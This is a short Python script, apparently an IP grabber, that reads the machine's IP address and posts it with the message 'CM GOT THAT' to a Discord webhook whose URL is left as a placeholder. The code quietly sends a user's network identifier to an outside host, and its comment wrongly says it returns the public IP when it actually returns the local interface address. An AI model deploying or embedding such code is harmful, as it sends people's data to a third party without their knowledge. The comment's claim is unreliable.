import requests
import json
import socket

def get_public_ip():
    # Restituisce l'indirizzo IP pubblico del computer
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]

def send_discord_webhook(webhook_url, message):
    # Invia un messaggio a un webhook di Discord
    data = {"content": message}
    requests.post(webhook_url, data=json.dumps(data), headers={"Content-Type": "application/json"})

if __name__ == "__main__":
    # Inserisci qui l'URL del tuo webhook di Discord
    webhook_url = "Webhook here"
    public_ip = get_public_ip()
    send_discord_webhook(webhook_url, f"CM GOT THAT\nIP: {public_ip}")